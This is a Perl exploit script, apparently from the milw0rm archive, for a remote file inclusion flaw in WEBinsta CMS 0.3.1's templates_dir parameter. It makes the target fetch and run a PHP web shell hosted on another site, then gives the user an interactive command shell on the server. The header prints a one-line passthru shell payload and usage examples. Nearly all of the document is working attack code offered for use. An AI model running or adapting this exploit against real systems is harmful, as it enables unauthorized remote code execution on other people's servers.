#!/usr/bin/perl
##
# WEBinsta CMS 0.3.1 (templates_dir) Remote File Inclusion Exploit
# Bug Found & code By K-159
##
# echo.or.id (c) 2006
#
##
# usage:
# perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable>
#
# perl WEBinsta.pl http://target.com/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
# #
#Greetz: My Dearest Wife - ping, echo|staff (y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative), SinChan, sakitjiwa, maSter-oP, mr_ny3m, bithedz, lieur-euy, x16, mbahngarso, etc
#
# Contact: www.echo.or.id #e-c-h-o @irc.dal.net
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'index.php?templates_dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)


{
       $finreturn = $1;
       $finreturn=~ tr/[....]/[\n]/;
       print "\r\n$finreturn\n\r";
       last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n============================================================================\r\n";
 print " *WEBinsta CMS 0.3.1 templates_dir Remote File Inclusion Exploit*\r\n";
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable>\r\n\n";
 print " <Site> - Full path to WEBinsta CMS ex: http://www.site.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                           Bug Found by K-159 \r\n";
 print "                    www.echo.or.id #e-c-h-o irc.dal.net 2006 \r\n";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2006-08-12]